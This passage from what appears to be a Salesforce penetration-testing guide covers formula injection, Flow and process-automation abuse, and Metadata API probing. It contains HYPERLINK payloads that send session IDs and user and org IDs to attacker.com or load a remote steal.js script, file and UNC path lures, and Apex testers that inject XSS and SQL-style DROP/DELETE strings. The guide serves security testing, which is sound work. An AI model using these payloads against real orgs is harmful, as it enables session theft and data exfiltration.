</span><span id="__span-63-18"><a id="__codelineno-63-18" name="__codelineno-63-18" href="#__codelineno-63-18"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Certificate validation failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Man-in-the-middle attacks, credential compromise, external service abuse.</p>
<hr />
<h2 id="advanced-attack-vectors">Advanced Attack Vectors</h2>
<h3 id="1-formula-injection-attacks">1. Formula Injection Attacks</h3>
<p><strong>Objective</strong>: Identify and exploit formula injection vulnerabilities in calculated fields and validation rules.</p>
<p><strong>Formula Field Discovery</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c1">-- Formula fields with potential injection risks</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">FormulaSourceText</span><span class="p">,</span>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="w">       </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span>
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">DataType</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Text&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Url&#39;</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">FormulaSourceText</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="w"> </span>
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">FormulaSourceText</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%HYPERLINK%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">FormulaSourceText</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%IMAGE%&#39;</span><span class="p">)</span>
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="c1">-- Validation rules with formulas</span>
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">ValidationName</span><span class="p">,</span><span class="w"> </span><span class="n">ErrorConditionFormula</span><span class="p">,</span><span class="w"> </span><span class="n">ErrorMessage</span><span class="p">,</span>
</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a><span class="w">       </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span>
</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ValidationRule</span><span class="w"> </span>
</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsActive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">ErrorConditionFormula</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%HYPERLINK%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">ErrorConditionFormula</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%TEXT%&#39;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Formula Injection Payloads</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="c1">// Information disclosure</span>
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="nx">HYPERLINK</span><span class="p">(</span><span class="s2">&quot;http://attacker.com/exfil?session=&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">$Api</span><span class="p">.</span><span class="nx">Session_ID</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Click Here&quot;</span><span class="p">)</span>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="c1">// User context information</span>
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="nx">HYPERLINK</span><span class="p">(</span><span class="s2">&quot;http://attacker.com/exfil?user=&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">$User</span><span class="p">.</span><span class="nx">Id</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">&quot;&amp;org=&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">$Organization</span><span class="p">.</span><span class="nx">Id</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Link&quot;</span><span class="p">)</span>
</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a>
</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a><span class="c1">// Cross-site scripting via formulas</span>
</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="nx">HYPERLINK</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS via Formula&#39;)&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Click for XSS&quot;</span><span class="p">)</span>
</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a>
</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a><span class="c1">// Advanced payload with data exfiltration</span>
</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a><span class="nx">HYPERLINK</span><span class="p">(</span><span class="s2">&quot;javascript:void((function(){var s=document.createElement(&#39;script&#39;);s.src=&#39;//attacker.com/steal.js&#39;;document.head.appendChild(s);})())&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Malicious Link&quot;</span><span class="p">)</span>
</span><span id="__span-65-12"><a id="__codelineno-65-12" name="__codelineno-65-12" href="#__codelineno-65-12"></a>
</span><span id="__span-65-13"><a id="__codelineno-65-13" name="__codelineno-65-13" href="#__codelineno-65-13"></a><span class="c1">// File system access (if enabled)</span>
</span><span id="__span-65-14"><a id="__codelineno-65-14" name="__codelineno-65-14" href="#__codelineno-65-14"></a><span class="nx">HYPERLINK</span><span class="p">(</span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;System Files&quot;</span><span class="p">)</span>
</span><span id="__span-65-15"><a id="__codelineno-65-15" name="__codelineno-65-15" href="#__codelineno-65-15"></a><span class="nx">HYPERLINK</span><span class="p">(</span><span class="s2">&quot;\\\\attacker.com\\share\\malicious.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Network Resource&quot;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Automated Formula Injection Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>public class FormulaInjectionTester {
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>    public static void testFormulaInjection(String objectName, String fieldName) {
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>        SObject testRecord = objectType.newSObject();
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>        List&lt;String&gt; payloads = new List&lt;String&gt;{
</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>            &#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;,
</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>            &#39;javascript:alert(&quot;XSS&quot;)&#39;,
</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>            &#39;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;,
</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a>            &#39;\&#39;;alert(&quot;XSS&quot;);var a=\&#39;&#39;,
</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>            &#39;http://attacker.com/steal?data=&#39;
</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a>        };
</span><span id="__span-66-13"><a id="__codelineno-66-13" name="__codelineno-66-13" href="#__codelineno-66-13"></a>
</span><span id="__span-66-14"><a id="__codelineno-66-14" name="__codelineno-66-14" href="#__codelineno-66-14"></a>        for (String payload : payloads) {
</span><span id="__span-66-15"><a id="__codelineno-66-15" name="__codelineno-66-15" href="#__codelineno-66-15"></a>            try {
</span><span id="__span-66-16"><a id="__codelineno-66-16" name="__codelineno-66-16" href="#__codelineno-66-16"></a>                testRecord.put(fieldName, payload);
</span><span id="__span-66-17"><a id="__codelineno-66-17" name="__codelineno-66-17" href="#__codelineno-66-17"></a>                insert testRecord;
</span><span id="__span-66-18"><a id="__codelineno-66-18" name="__codelineno-66-18" href="#__codelineno-66-18"></a>
</span><span id="__span-66-19"><a id="__codelineno-66-19" name="__codelineno-66-19" href="#__codelineno-66-19"></a>                String query = &#39;SELECT Id, &#39; + fieldName + &#39; FROM &#39; + objectName + 
</span><span id="__span-66-20"><a id="__codelineno-66-20" name="__codelineno-66-20" href="#__codelineno-66-20"></a>                              &#39; WHERE Id = \&#39;&#39; + testRecord.Id + &#39;\&#39;&#39;;
</span><span id="__span-66-21"><a id="__codelineno-66-21" name="__codelineno-66-21" href="#__codelineno-66-21"></a>                List&lt;SObject&gt; results = Database.query(query);
</span><span id="__span-66-22"><a id="__codelineno-66-22" name="__codelineno-66-22" href="#__codelineno-66-22"></a>
</span><span id="__span-66-23"><a id="__codelineno-66-23" name="__codelineno-66-23" href="#__codelineno-66-23"></a>                if (!results.isEmpty()) {
</span><span id="__span-66-24"><a id="__codelineno-66-24" name="__codelineno-66-24" href="#__codelineno-66-24"></a>                    String resultValue = String.valueOf(results[0].get(fieldName));
</span><span id="__span-66-25"><a id="__codelineno-66-25" name="__codelineno-66-25" href="#__codelineno-66-25"></a>                    if (resultValue.contains(&#39;javascript:&#39;) || resultValue.contains(&#39;&lt;script&gt;&#39;)) {
</span><span id="__span-66-26"><a id="__codelineno-66-26" name="__codelineno-66-26" href="#__codelineno-66-26"></a>                        System.debug(&#39;Potential formula injection: &#39; + payload);
</span><span id="__span-66-27"><a id="__codelineno-66-27" name="__codelineno-66-27" href="#__codelineno-66-27"></a>                    }
</span><span id="__span-66-28"><a id="__codelineno-66-28" name="__codelineno-66-28" href="#__codelineno-66-28"></a>                }
</span><span id="__span-66-29"><a id="__codelineno-66-29" name="__codelineno-66-29" href="#__codelineno-66-29"></a>
</span><span id="__span-66-30"><a id="__codelineno-66-30" name="__codelineno-66-30" href="#__codelineno-66-30"></a>                delete testRecord;
</span><span id="__span-66-31"><a id="__codelineno-66-31" name="__codelineno-66-31" href="#__codelineno-66-31"></a>            } catch (Exception e) {
</span><span id="__span-66-32"><a id="__codelineno-66-32" name="__codelineno-66-32" href="#__codelineno-66-32"></a>                System.debug(&#39;Payload blocked: &#39; + payload + &#39; - &#39; + e.getMessage());
</span><span id="__span-66-33"><a id="__codelineno-66-33" name="__codelineno-66-33" href="#__codelineno-66-33"></a>            }
</span><span id="__span-66-34"><a id="__codelineno-66-34" name="__codelineno-66-34" href="#__codelineno-66-34"></a>        }
</span><span id="__span-66-35"><a id="__codelineno-66-35" name="__codelineno-66-35" href="#__codelineno-66-35"></a>    }
</span><span id="__span-66-36"><a id="__codelineno-66-36" name="__codelineno-66-36" href="#__codelineno-66-36"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Information disclosure, client-side code execution, data exfiltration.</p>
<h3 id="2-process-automation-exploitation">2. Process Automation Exploitation</h3>
<p><strong>Objective</strong>: Identify security vulnerabilities in Process Builder, Flow, and Workflow automation.</p>
<p><strong>Process &amp; Flow Discovery</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c1">-- Active processes and flows</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">ProcessType</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="w">       </span><span class="n">LastModifiedDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">TriggerType</span>
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Flow</span><span class="w"> </span>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span><span class="w"> </span>
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">ProcessType</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Flow&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Workflow&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;AutoLaunchedFlow&#39;</span><span class="p">)</span>
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>
</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="c1">-- Process builder definitions</span>
</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="k">Type</span><span class="p">,</span><span class="w"> </span><span class="k">State</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">TableEnumOrId</span><span class="p">,</span>
</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a><span class="w">       </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedBy</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-67-11"><a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ProcessDefinition</span><span class="w"> </span>
</span><span id="__span-67-12"><a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a><span class="k">WHERE</span><span class="w"> </span><span class="k">State</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span><span id="__span-67-13"><a id="__codelineno-67-13" name="__codelineno-67-13" href="#__codelineno-67-13"></a>
</span><span id="__span-67-14"><a id="__codelineno-67-14" name="__codelineno-67-14" href="#__codelineno-67-14"></a><span class="c1">-- Flow interviews (execution instances)</span>
</span><span id="__span-67-15"><a id="__codelineno-67-15" name="__codelineno-67-15" href="#__codelineno-67-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">CurrentElement</span><span class="p">,</span><span class="w"> </span><span class="n">FlowVersionView</span><span class="p">.</span><span class="n">ProcessType</span><span class="p">,</span>
</span><span id="__span-67-16"><a id="__codelineno-67-16" name="__codelineno-67-16" href="#__codelineno-67-16"></a><span class="w">       </span><span class="n">StartTime</span><span class="p">,</span><span class="w"> </span><span class="n">PauseTime</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-67-17"><a id="__codelineno-67-17" name="__codelineno-67-17" href="#__codelineno-67-17"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FlowInterview</span><span class="w"> </span>
</span><span id="__span-67-18"><a id="__codelineno-67-18" name="__codelineno-67-18" href="#__codelineno-67-18"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TODAY</span><span class="w"> </span>
</span><span id="__span-67-19"><a id="__codelineno-67-19" name="__codelineno-67-19" href="#__codelineno-67-19"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">StartTime</span><span class="w"> </span><span class="k">DESC</span>
</span></code></pre></div></p>
<p><strong>Process Automation Security Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>// Test flow input validation
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>public class FlowSecurityTester {
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>    public static void testFlowInputValidation(String flowApiName) {
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>        Map&lt;String, Object&gt; inputVariables = new Map&lt;String, Object&gt;();
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>
</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>        // Injection payloads for flow inputs
</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>        inputVariables.put(&#39;textInput&#39;, &#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;);
</span><span id="__span-68-8"><a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a>        inputVariables.put(&#39;emailInput&#39;, &#39;test@example.com; DELETE FROM Account;&#39;);
</span><span id="__span-68-9"><a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a>        inputVariables.put(&#39;numberInput&#39;, &#39;1; DROP TABLE User;&#39;);
</span><span id="__span-68-10"><a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a>
</span><span id="__span-68-11"><a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a>        try {
</span><span id="__span-68-12"><a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a>            Flow.Interview flowInterview = Flow.Interview.createInterview(flowApiName, inputVariables);
</span><span id="__span-68-13"><a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a>            flowInterview.start();
</span><span id="__span-68-14"><a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a>            System.debug(&#39;Flow executed with malicious input&#39;);
</span><span id="__span-68-15"><a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a>        } catch (Exception e) {
</span><span id="__span-68-16"><a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a>            System.debug(&#39;Flow execution blocked: &#39; + e.getMessage());
</span><span id="__span-68-17"><a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a>        }
</span><span id="__span-68-18"><a id="__codelineno-68-18" name="__codelineno-68-18" href="#__codelineno-68-18"></a>    }
</span><span id="__span-68-19"><a id="__codelineno-68-19" name="__codelineno-68-19" href="#__codelineno-68-19"></a>}
</span><span id="__span-68-20"><a id="__codelineno-68-20" name="__codelineno-68-20" href="#__codelineno-68-20"></a>
</span><span id="__span-68-21"><a id="__codelineno-68-21" name="__codelineno-68-21" href="#__codelineno-68-21"></a>// Test for privilege escalation in system context
</span><span id="__span-68-22"><a id="__codelineno-68-22" name="__codelineno-68-22" href="#__codelineno-68-22"></a>public class PrivilegeEscalationTest {
</span><span id="__span-68-23"><a id="__codelineno-68-23" name="__codelineno-68-23" href="#__codelineno-68-23"></a>    public static void testSystemContextAbuse() {
</span><span id="__span-68-24"><a id="__codelineno-68-24" name="__codelineno-68-24" href="#__codelineno-68-24"></a>        Profile standardProfile = [SELECT Id FROM Profile WHERE Name = &#39;Standard User&#39; LIMIT 1];
</span><span id="__span-68-25"><a id="__codelineno-68-25" name="__codelineno-68-25" href="#__codelineno-68-25"></a>        User testUser = new User(
</span><span id="__span-68-26"><a id="__codelineno-68-26" name="__codelineno-68-26" href="#__codelineno-68-26"></a>            Username = &#39;lowpriv@test.com&#39;,
</span><span id="__span-68-27"><a id="__codelineno-68-27" name="__codelineno-68-27" href="#__codelineno-68-27"></a>            Email = &#39;lowpriv@test.com&#39;,
</span><span id="__span-68-28"><a id="__codelineno-68-28" name="__codelineno-68-28" href="#__codelineno-68-28"></a>            LastName = &#39;LowPriv&#39;,
</span><span id="__span-68-29"><a id="__codelineno-68-29" name="__codelineno-68-29" href="#__codelineno-68-29"></a>            Alias = &#39;lowpriv&#39;,
</span><span id="__span-68-30"><a id="__codelineno-68-30" name="__codelineno-68-30" href="#__codelineno-68-30"></a>            ProfileId = standardProfile.Id,
</span><span id="__span-68-31"><a id="__codelineno-68-31" name="__codelineno-68-31" href="#__codelineno-68-31"></a>            TimeZoneSidKey = &#39;America/New_York&#39;,
</span><span id="__span-68-32"><a id="__codelineno-68-32" name="__codelineno-68-32" href="#__codelineno-68-32"></a>            LocaleSidKey = &#39;en_US&#39;,
</span><span id="__span-68-33"><a id="__codelineno-68-33" name="__codelineno-68-33" href="#__codelineno-68-33"></a>            EmailEncodingKey = &#39;UTF-8&#39;,
</span><span id="__span-68-34"><a id="__codelineno-68-34" name="__codelineno-68-34" href="#__codelineno-68-34"></a>            LanguageLocaleKey = &#39;en_US&#39;
</span><span id="__span-68-35"><a id="__codelineno-68-35" name="__codelineno-68-35" href="#__codelineno-68-35"></a>        );
</span><span id="__span-68-36"><a id="__codelineno-68-36" name="__codelineno-68-36" href="#__codelineno-68-36"></a>        insert testUser;
</span><span id="__span-68-37"><a id="__codelineno-68-37" name="__codelineno-68-37" href="#__codelineno-68-37"></a>
</span><span id="__span-68-38"><a id="__codelineno-68-38" name="__codelineno-68-38" href="#__codelineno-68-38"></a>        System.runAs(testUser) {
</span><span id="__span-68-39"><a id="__codelineno-68-39" name="__codelineno-68-39" href="#__codelineno-68-39"></a>            Account testAccount = new Account(Name = &#39;Privilege Escalation Test&#39;);
</span><span id="__span-68-40"><a id="__codelineno-68-40" name="__codelineno-68-40" href="#__codelineno-68-40"></a>            insert testAccount;
</span><span id="__span-68-41"><a id="__codelineno-68-41" name="__codelineno-68-41" href="#__codelineno-68-41"></a>
</span><span id="__span-68-42"><a id="__codelineno-68-42" name="__codelineno-68-42" href="#__codelineno-68-42"></a>            try {
</span><span id="__span-68-43"><a id="__codelineno-68-43" name="__codelineno-68-43" href="#__codelineno-68-43"></a>                List&lt;User&gt; adminUsers = [SELECT Id FROM User WHERE Profile.Name = &#39;System Administrator&#39;];
</span><span id="__span-68-44"><a id="__codelineno-68-44" name="__codelineno-68-44" href="#__codelineno-68-44"></a>                if (!adminUsers.isEmpty()) {
</span><span id="__span-68-45"><a id="__codelineno-68-45" name="__codelineno-68-45" href="#__codelineno-68-45"></a>                    System.debug(&#39;Unauthorized access to admin users via process&#39;);
</span><span id="__span-68-46"><a id="__codelineno-68-46" name="__codelineno-68-46" href="#__codelineno-68-46"></a>                }
</span><span id="__span-68-47"><a id="__codelineno-68-47" name="__codelineno-68-47" href="#__codelineno-68-47"></a>            } catch (Exception e) {
</span><span id="__span-68-48"><a id="__codelineno-68-48" name="__codelineno-68-48" href="#__codelineno-68-48"></a>                System.debug(&#39;Process properly enforced security: &#39; + e.getMessage());
</span><span id="__span-68-49"><a id="__codelineno-68-49" name="__codelineno-68-49" href="#__codelineno-68-49"></a>            }
</span><span id="__span-68-50"><a id="__codelineno-68-50" name="__codelineno-68-50" href="#__codelineno-68-50"></a>        }
</span><span id="__span-68-51"><a id="__codelineno-68-51" name="__codelineno-68-51" href="#__codelineno-68-51"></a>    }
</span><span id="__span-68-52"><a id="__codelineno-68-52" name="__codelineno-68-52" href="#__codelineno-68-52"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Automated privilege escalation, system abuse, data manipulation.</p>
<h3 id="3-metadata-api-security-exploitation">3. Metadata API Security Exploitation</h3>
<p><strong>Objective</strong>: Test metadata manipulation capabilities for security control bypass.</p>
<p><strong>Metadata API Access Testing</strong>:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="cm">&lt;!-- Test metadata retrieval --&gt;</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="nt">&lt;soapenv:Envelope</span><span class="w"> </span><span class="na">xmlns:soapenv=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="w"> </span>
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="w">                  </span><span class="na">xmlns:met=</span><span class="s">&quot;http://soap.sforce.com/2006/04/metadata&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="w">    </span><span class="nt">&lt;soapenv:Header&gt;</span>
</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a><span class="w">        </span><span class="nt">&lt;met:SessionHeader&gt;</span>
</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="w">            </span><span class="nt">&lt;met:sessionId&gt;</span>SESSION_ID<span class="nt">&lt;/met:sessionId&gt;</span>
</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="w">        </span><span class="nt">&lt;/met:SessionHeader&gt;</span>
</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a><span class="w">    </span><span class="nt">&lt;/soapenv:Header&gt;</span>
</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a><span class="w">    </span><span class="nt">&lt;soapenv:Body&gt;</span>
</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a><span class="w">        </span><span class="nt">&lt;met:listMetadata&gt;</span>
